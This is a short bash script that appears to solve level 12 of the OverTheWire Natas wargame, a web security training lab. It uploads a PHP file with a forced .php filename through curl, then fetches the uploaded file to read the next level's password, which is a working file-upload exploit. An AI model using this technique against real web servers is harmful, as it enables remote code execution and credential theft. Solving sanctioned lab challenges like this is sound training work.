#!/bin/bash
if [ $# -eq 0 ] ; then
  echo "Please pass the password as argument"
  exit
elif [ $# -eq 1 ] ; then
  echo "You can specify your own filepath with the second argument"
  path=$PWD/natas12.php
else
  path=$2
fi
# We can upload a file to the server
# Since we can control the form parameters using curl, we can actually
# control the file extension.
# Let's fill out the form
# We will just upload the file natas12.php if the user doesn't specifiy otherwise.
base_url="http://natas12.natas.labs.overthewire.org/"
regex=">(upload/[[:alnum:]]{10}\.php)"
content=`curl -s --user natas12:$1 \
  -F "MAX_FILE_SIZE=1000" \
  -F "filename=natas12.php" \
  -F "uploadedfile=@$path" \
  -F "submit=Upload File" \
  $base_url`

if [[ $content =~ $regex ]]
then
  echo 'The password for natas13 is' $(curl -s --user natas12:$1 \
    $base_url${BASH_REMATCH[1]})
fi
